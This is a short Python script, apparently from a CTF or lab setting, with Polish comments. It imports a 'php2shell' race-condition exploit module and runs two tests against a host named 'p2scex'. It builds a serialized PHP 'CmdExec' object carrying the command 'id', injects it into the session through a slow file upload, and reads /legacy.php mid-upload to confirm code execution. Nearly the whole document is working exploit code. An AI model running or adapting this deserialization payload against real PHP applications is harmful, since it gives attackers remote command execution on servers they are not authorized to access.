import sys, time, threading, re
sys.path.insert(0, '/x/exploit')
import importlib.util
spec = importlib.util.spec_from_file_location("r", "/x/exploit/php2shell_8512_race.py")
r = importlib.util.module_from_spec(spec)
# nie odpalaj main; potrzebujemy funkcji
import types
src = open('/x/exploit/php2shell_8512_race.py').read()
src = src.replace('if __name__ == "__main__":\n    main()', '')
mod = types.ModuleType("r"); exec(compile(src, "r", "exec"), mod.__dict__)

HOST, PORT = "p2scex", 80
st, body, sid = mod.http(HOST, PORT, "/index.php", want_cookie=True)
print(f"sid={sid}")
CMD = b"id"
obj = b'O:7:"CmdExec":1:{s:3:"cmd";s:%d:"%s";}' % (len(CMD), CMD)
prog = b"inj|" + obj

print("\n[TEST 1] szybki upload (cleanup zdazy) -> potem read:")
# szybki: delay=0 => calosc od razu
t0=time.time()
mod.slow_upload(HOST, PORT, sid, prog, file_mb=1, chunk=1024*1024, delay=0)
print(f"  upload done in {time.time()-t0:.2f}s")
time.sleep(1.0)  # cleanup powinien zadzialac
st, body, _ = mod.http(HOST, PORT, "/legacy.php", cookie=sid)
print(f"  legacy read: uid_in_body={'uid=' in body.decode('latin1')} | {body[:60]!r}")

print("\n[TEST 2] slow upload -> read W TRAKCIE (okno):")
st, body, sid2 = mod.http(HOST, PORT, "/index.php", want_cookie=True)
t = threading.Thread(target=mod.slow_upload, args=(HOST,PORT,sid2,prog), kwargs={"file_mb":4}, daemon=True)
t.start(); time.sleep(1.0)
st, body, _ = mod.http(HOST, PORT, "/legacy.php", cookie=sid2, timeout=5)
txt = body.decode("latin1")
print(f"  read mid-upload: uid_in_body={'uid=' in txt}")
print(f"  {'>>> OKNO POTWIERDZONE' if 'uid=' in txt else '>>> brak (cos nie tak)'}")
